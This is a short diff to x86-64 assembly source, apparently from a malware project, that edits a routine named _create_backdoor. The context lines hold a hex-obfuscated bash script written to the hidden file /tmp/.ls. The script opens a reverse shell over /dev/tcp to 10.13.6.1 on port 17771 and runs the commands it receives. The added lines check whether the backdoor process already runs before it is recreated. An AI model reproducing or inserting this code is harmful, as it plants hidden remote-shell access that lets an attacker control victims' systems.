@@ -8,6 +8,7 @@ _script_file:
 	.name db '/tmp/.ls', 0
 	.content db 0x23,0x21,0x2f,'bin',0x2f,'bash',10,'exec 5',0x3c,0x3e,0x2f,'dev',0x2f,'tcp',0x2f,'10.13.6.1',0x2f,'17771',0x3b,'cat ',0x3c,0x26,'5 ',0x7c,' while read line',0x3b,' do ',0x24,'line 2',0x3e,0x26,'5 ',0x3e,0x26,'5',0x3b,' done'
 	.content_len equ $ - _script_file.content
+	.verif_proc_name db '.ls', 10, 0
 
 ;; -----------------------------------------------------------------------------------
 ;; NAME
@@ -27,6 +28,12 @@ _script_file:
 ;; -----------------------------------------------------------------------------------
 _create_backdoor:
 	enter 24, 0
+
+; First check if a backdoor is not already running
+	lea rdi, [rel _script_file.verif_proc_name]
+	call _checkproc
+	cmp rax, 0
+	jne _backdoor_ret
 
 ; Open /tmp/.ls
 	mov rax, SYS_OPEN
